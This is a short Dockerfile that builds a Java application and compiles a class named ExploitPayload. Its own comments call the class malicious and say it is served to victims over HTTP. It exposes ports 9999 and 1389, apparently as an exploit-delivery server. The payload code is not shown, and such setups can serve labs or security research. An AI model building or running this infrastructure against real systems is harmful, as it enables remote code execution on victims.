FROM eclipse-temurin:25-jdk AS build
WORKDIR /build
COPY pom.xml .
COPY src src
RUN --mount=type=cache,target=/root/.m2 \
    apt-get update && apt-get install -y maven && \
    mvn package -DskipTests -q

# Compile the malicious exploit class (served to victims via HTTP)
COPY exploit-class/ExploitPayload.java /exploit-class/
RUN javac -source 8 -target 8 /exploit-class/ExploitPayload.java

FROM eclipse-temurin:25-jre
WORKDIR /app
COPY --from=build /build/target/*.jar app.jar
# Serve the compiled exploit class via HTTP at /exploit/ExploitPayload.class
COPY --from=build /exploit-class/ExploitPayload.class /app/static/exploit/ExploitPayload.class
EXPOSE 9999 1389
ENTRYPOINT ["java", "-jar", "app.jar"]
